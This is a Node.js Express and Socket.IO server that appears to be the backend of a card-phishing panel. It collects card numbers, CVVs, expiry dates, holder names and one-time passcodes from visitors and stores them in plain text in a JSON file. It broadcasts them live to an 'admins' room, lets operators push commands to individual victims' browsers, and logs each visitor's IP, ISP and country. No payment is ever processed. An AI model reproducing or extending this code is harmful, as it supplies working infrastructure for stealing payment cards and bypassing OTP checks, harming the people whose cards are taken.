
const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();

// Enhanced CORS configuration for production
app.use(cors({
  origin: ['https://dev49.onrender.com', 'http://localhost:8080', 'http://localhost:5173'],
  credentials: true
}));

const port = process.env.PORT || 8080;
const server = http.createServer(app);

// Enhanced Socket.IO configuration
const io = new Server(server, {
  cors: {
    origin: ['https://dev49.onrender.com', 'http://localhost:8080', 'http://localhost:5173'],
    methods: ['GET', 'POST'],
    credentials: true
  },
  upgradeTimeout: 30000,
  transports: ['polling', 'websocket']
});

// Middleware for parsing JSON
app.use(express.json());

// In-memory storage for card submissions
const submissionsFilePath = path.join(__dirname, 'submissions.json');
let cardSubmissionsQueue = [];

// In-memory storage for active visitors - using Map to prevent duplicates by IP
let activeVisitors = new Map();

// Function to load submissions from file
const loadSubmissions = () => {
  try {
    if (fs.existsSync(submissionsFilePath)) {
      const data = fs.readFileSync(submissionsFilePath, 'utf8');
      cardSubmissionsQueue = JSON.parse(data);
      console.log(`[Server] Loaded ${cardSubmissionsQueue.length} submissions from file.`);
    }
  } catch (error) {
    console.error('[Server] Error loading submissions from file:', error);
  }
};

// Function to save submissions to file
const saveSubmissions = () => {
  try {
    fs.writeFileSync(submissionsFilePath, JSON.stringify(cardSubmissionsQueue, null, 2), 'utf8');
    console.log('[Server] Submissions saved to file.');
  } catch (error) {
    console.error('[Server] Error saving submissions to file:', error);
  }
};

// Function to get client IP address with better detection
const getClientIP = (socket) => {
  const forwarded = socket.handshake.headers['x-forwarded-for'];
  const realIp = socket.handshake.headers['x-real-ip'];
  const cfConnectingIp = socket.handshake.headers['cf-connecting-ip'];
  const remoteAddress = socket.conn.remoteAddress;
  const handshakeAddress = socket.handshake.address;
  
  let ip = 'Unknown';
  
  if (cfConnectingIp) {
    ip = cfConnectingIp;
  } else if (forwarded) {
    ip = forwarded.split(',')[0].trim();
  } else if (realIp) {
    ip = realIp;
  } else if (remoteAddress) {
    ip = remoteAddress.replace('::ffff:', '');
  } else if (handshakeAddress) {
    ip = handshakeAddress.replace('::ffff:', '');
  }
  
  // Clean up common localhost variations
  if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') {
    ip = '127.0.0.1';
  }
  
  console.log(`[Server] Detected client IP: ${ip} (forwarded: ${forwarded}, real-ip: ${realIp}, cf: ${cfConnectingIp}, remote: ${remoteAddress})`);
  return ip;
};

// Function to fetch real location and ISP data
const getLocationData = async (ip) => {
  // For localhost/development, return local data
  if (ip === '127.0.0.1' || ip === 'localhost' || ip === '::1' || ip === 'Unknown') {
    return {
      isp: 'Local Development',
      country: 'Localhost',
      country_flag: '💻'
    };
  }
  
  try {
    // Using ip-api.com which is free and doesn't require API key
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,isp,org,query`);
    const data = await response.json();
    
    if (data.status === 'success') {
      // Get country flag emoji
      const countryCode = data.countryCode;
      const flagEmoji = countryCode ? getCountryFlag(countryCode) : '🌍';
      
      console.log(`[Server] IP location data for ${ip}:`, data);
      
      return {
        isp: data.isp || data.org || 'Unknown ISP',
        country: data.country || 'Unknown',
        country_flag: flagEmoji
      };
    } else {
      console.log(`[Server] IP API failed for ${ip}:`, data);
      return {
        isp: 'Unknown ISP',
        country: 'Unknown Location',
        country_flag: '🌍'
      };
    }
  } catch (error) {
    console.error(`[Server] Error fetching location data for IP ${ip}:`, error);
    return {
      isp: 'Unknown ISP',
      country: 'Unknown Location',
      country_flag: '🌍'
    };
  }
};

// Function to convert country code to flag emoji
const getCountryFlag = (countryCode) => {
  if (!countryCode || countryCode.length !== 2) return '🌍';
  
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map(char => 127397 + char.charCodeAt());
  
  return String.fromCodePoint(...codePoints);
};

// Load submissions when the server starts
loadSubmissions();

// Clean up inactive visitors every 2 minutes - Fixed to prevent duplicates
setInterval(() => {
  const now = Date.now();
  const inactiveThreshold = 2 * 60 * 1000; // 2 minutes
  
  for (const [socketId, visitor] of activeVisitors.entries()) {
    if (now - visitor.lastSeen > inactiveThreshold) {
      console.log(`[Server] Removing inactive visitor: ${socketId}`);
      activeVisitors.delete(socketId);
      io.emit('visitor_left', { id: socketId });
    }
  }
}, 30000); // Check every 30 seconds

// Socket.IO connection handling
io.on('connection', async (socket) => {
  console.log(`[Server] Socket.IO connection established: ${socket.id}`);
  
  const clientIp = getClientIP(socket);
  console.log(`[Server] Processing connection for IP: ${clientIp}`);
  
  // Check if visitor with same IP already exists to prevent duplicates
  let existingVisitor = null;
  for (const [socketId, visitor] of activeVisitors.entries()) {
    if (visitor.ip === clientIp && socketId !== socket.id) {
      existingVisitor = visitor;
      // Remove the old entry
      activeVisitors.delete(socketId);
      io.emit('visitor_left', { id: socketId });
      break;
    }
  }
  
  // Fetch real location data
  const locationData = await getLocationData(clientIp);
  console.log(`[Server] Location data for ${clientIp}:`, locationData);
  
  // Create visitor object
  const visitor = {
    id: socket.id,
    ip: clientIp,
    user_agent: socket.handshake.headers['user-agent'] || 'Unknown',
    device_time: new Date().toLocaleString(),
    created_at: new Date().toISOString(),
    lastSeen: Date.now(),
    ...locationData
  };
  
  // Store visitor with socket ID as key to prevent duplicates
  activeVisitors.set(socket.id, visitor);
  
  console.log(`[Server] New visitor: ${socket.id} from ${clientIp} (${locationData.country}, ${locationData.isp})`);
  
  // Broadcast visitor update to admins
  io.to('admins').emit('visitor_update', visitor);
  io.to('admins').emit('enhanced_visitor', visitor);
  
  socket.on('disconnect', (reason) => {
    console.log(`[Server] Socket.IO disconnected: ${socket.id}, reason: ${reason}`);
    activeVisitors.delete(socket.id);
    io.emit('visitor_left', { id: socket.id });
  });

  // Handler for visitor connected event
  socket.on('visitor_connected', async (payload) => {
    console.log(`[Server] Visitor connected event from ${socket.id}:`, payload);
    
    // Update visitor info with fresh location data
    const freshLocationData = await getLocationData(clientIp);
    
    if (activeVisitors.has(socket.id)) {
      const existingVisitor = activeVisitors.get(socket.id);
      const updatedVisitor = {
        ...existingVisitor,
        ...payload,
        ...freshLocationData,
        ip: clientIp, // Ensure we keep the real IP
        lastSeen: Date.now()
      };
      activeVisitors.set(socket.id, updatedVisitor);
      
      console.log(`[Server] Updated visitor ${socket.id} with fresh data:`, updatedVisitor);
      
      // Broadcast updated visitor info to admins
      io.to('admins').emit('visitor_update', updatedVisitor);
      io.to('admins').emit('enhanced_visitor', updatedVisitor);
    }
  });

  // Handler for an admin identifying themselves
  socket.on('admin_hello', () => {
    socket.join('admins');
    console.log(`[Server] Admin connected: ${socket.id}`);

    // Send all queued card submissions to the newly connected admin
    console.log(`[Server] Sending ${cardSubmissionsQueue.length} submissions to admin`);
    cardSubmissionsQueue.forEach(submission => {
      socket.emit('card_submission', submission);
    });
    
    // Send all current visitors to the admin
    activeVisitors.forEach(visitor => {
      socket.emit('visitor_update', visitor);
      socket.emit('enhanced_visitor', visitor);
    });
    
    console.log(`[Server] Sent ${activeVisitors.size} current visitors to admin`);
  });

  // Enhanced card data handler with better validation and debugging
  socket.on('card_submission', (payload) => {
    console.log(`[Server] Received card submission from ${socket.id}:`, payload);
    
    // Validate required fields
    const requiredFields = ['card_number', 'expiry_month', 'expiry_year', 'cvv', 'card_holder', 'amount'];
    const missingFields = requiredFields.filter(field => !payload[field]);
    
    if (missingFields.length > 0) {
      console.error('[Server] Missing required fields:', missingFields);
      socket.emit('submission_error', { error: 'Missing required fields', fields: missingFields });
      return;
    }

    // Format the submission data
    const submissionPayload = {
      id: socket.id,
      socket_id: socket.id,
      ...payload,
      user_ip: clientIp,
      created_at: new Date().toISOString(),
      status: 'pending'
    };

    // Add card type detection
    const cardNumber = payload.card_number.replace(/\s/g, '');
    submissionPayload.card_type = detectCardType(cardNumber);

    // Add the submission to the in-memory queue
    cardSubmissionsQueue.push(submissionPayload);
    saveSubmissions();
    console.log(`[Server] Card submission processed and queued. Queue size: ${cardSubmissionsQueue.length}`);

    // Send the data to ALL admins with immediate broadcast
    console.log(`[Server] Broadcasting card submission to admins:`, submissionPayload);
    io.to('admins').emit('card_submission', submissionPayload);
    
    // Send confirmation back to the submitter
    socket.emit('submission_received', { id: socket.id, status: 'received' });
  });

  // Helper function to detect card type
  function detectCardType(cardNumber) {
    if (cardNumber.startsWith('4')) return 'Visa';
    if (cardNumber.startsWith('5')) return 'MasterCard';
    if (cardNumber.startsWith('6')) return 'Discover';
    if (cardNumber.startsWith('3')) return 'American Express';
    return 'Unknown';
  }

  // Handler for commands from an admin
  socket.on('admin_command', (payload) => {
    console.log(`[Server] Admin command received:`, payload);
    io.to('admins').emit('admin_command', payload);

    const targetSocketId = payload.submission_id;
    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket) {
        console.log(`[Server] Sending command to target socket: ${targetSocketId}`);
        targetSocket.emit('admin_command', payload);
      } else {
        console.log(`[Server] Target socket ${targetSocketId} not found`);
      }
    }
  });

  // Handler for OTPs from a user
  socket.on('otp_submitted', (payload) => {
    console.log(`[Server] Received otp_submitted from ${socket.id} for submission_id: ${payload.submission_id}, OTP: ${payload.otp}`);
    const otpPayload = {
      ...payload,
      submission_id: payload.submission_id,
      otp: payload.otp
    };
    io.to('admins').emit('otp_submitted', otpPayload);
  });

  // Chat handlers
  socket.on('chat_message', (payload) => {
    io.emit('chat_message', payload);
  });

  socket.on('start_chat', (payload) => {
    io.emit('start_chat', payload);
  });

  // Update last seen time on any activity
  socket.onAny(() => {
    if (activeVisitors.has(socket.id)) {
      const visitor = activeVisitors.get(socket.id);
      visitor.lastSeen = Date.now();
      activeVisitors.set(socket.id, visitor);
    }
  });
});

// Serve static files from the dist directory (built React app)
const distPath = path.join(__dirname, 'dist');
console.log('[Server] Serving static files from:', distPath);

// Check if dist directory exists
if (fs.existsSync(distPath)) {
  app.use(express.static(distPath, {
    maxAge: '1y',
    etag: false
  }));
  console.log('[Server] Static files configured successfully');
} else {
  console.warn('[Server] Warning: dist directory not found at:', distPath);
}

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
});

// API endpoint for submissions (if needed)
app.get('/api/submissions', (req, res) => {
  res.json({ count: cardSubmissionsQueue.length });
});

// Catch-all handler: send back React's index.html file for client-side routing
app.get('*', (req, res) => {
  const indexPath = path.join(distPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    res.status(404).send('Application not built. Please run build process.');
  }
});

// Enhanced error handling
server.on('error', (error) => {
  console.error('[Server] Server error:', error);
});

server.on('upgrade', (req, socket, head) => {
  console.log('[Server] HTTP Upgrade request received:', req.url);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('[Server] SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('[Server] Process terminated');
  });
});

process.on('SIGINT', () => {
  console.log('[Server] SIGINT received, shutting down gracefully');
  server.close(() => {
    console.log('[Server] Process terminated');
  });
});

// Start server
server.listen(port, '0.0.0.0', () => {
  console.log(`[Server] Server is running on port ${port}`);
  console.log(`[Server] Environment: ${process.env.NODE_ENV || 'development'}`);
});
